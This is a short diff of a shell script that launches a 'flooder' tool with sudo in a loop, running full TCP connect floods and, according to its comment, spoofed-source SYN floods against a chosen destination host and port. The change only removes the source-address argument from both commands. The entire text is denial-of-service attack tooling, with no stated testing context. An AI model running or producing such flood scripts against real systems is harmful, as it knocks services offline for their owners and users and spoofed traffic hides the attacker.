@@ -10,9 +10,9 @@ SRC=${4:-127.0.0.1}
 
 for i in $(seq 1 $COUNT); do
   # full TCP connect
-  sudo ./flooder -m normal -d "$DEST" -p "$PORT" -s "$SRC" &
+  sudo ./flooder -m normal -d "$DEST" -p "$PORT" -s &
   # spoofed SYN flood (random src IP)
-  sudo ./flooder -m syn -d "$DEST" -p "$PORT" -r "$SRC" &
+  sudo ./flooder -m syn -d "$DEST" -p "$PORT" -r &
 done
 
 wait
